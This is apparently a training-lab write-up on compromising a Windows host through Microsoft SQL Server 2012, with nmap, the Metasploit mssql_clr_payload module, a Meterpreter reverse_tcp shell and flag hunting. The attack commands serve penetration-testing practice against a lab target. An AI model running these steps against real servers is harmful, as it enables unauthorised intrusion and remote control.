

## 1. Lab Overview

This lab focuses on exploiting a Windows machine using Microsoft SQL Server (MSSQL) and the Metasploit Framework.

**Target:** `target.ine.local`

## 2. Tools Used
- Nmap
- Metasploit Framework
- Meterpreter

## 3. Initial Enumeration

Scan the target to identify open ports and services.

nmap -sSCV -p- target.ine.local

The scan identifies Microsoft SQL Server 2012 running on port `1433`.

## 4. MSSQL Exploitation

Start Metasploit:

service postgresql start
msfconsole -q

Search for the MSSQL exploit:

search mssql 2012

Select the exploit:use exploit/windows/mssql/mssql_clr_payload

Configure the target and payload:

set RHOSTS target.ine.local

set PAYLOAD windows/x64/meterpreter/reverse_tcp

Execute the exploit:run

A Meterpreter session provides access to the target machine.

## 5. Flag Collection

Check the current user:

getuid

List files:

dir C:\

Read the first flag:cat C:\\flag1.txt

Use Meterpreter to search for additional flag files:

search -f flag*

For the remaining flags, enumerate the Windows configuration directory, system directories, and Administrator's files.

If higher privileges are required, check available privileges:

getprivs

Use the appropriate privilege escalation method in the lab and verify the resulting access with:

getuid

Retrieve the remaining flags from their discovered locations.

## 6. Key Learnings

- Nmap service enumeration.
- MSSQL vulnerability identification.
- Exploitation using Metasploit.
- Meterpreter session management.
- Windows privilege escalation.
- Windows file and directory enumeration.

## 7. Conclusion

This lab provided practical experience in exploiting Microsoft SQL Server using Metasploit, obtaining remote access, performing privilege escalation, and searching Windows directories for sensitive files.
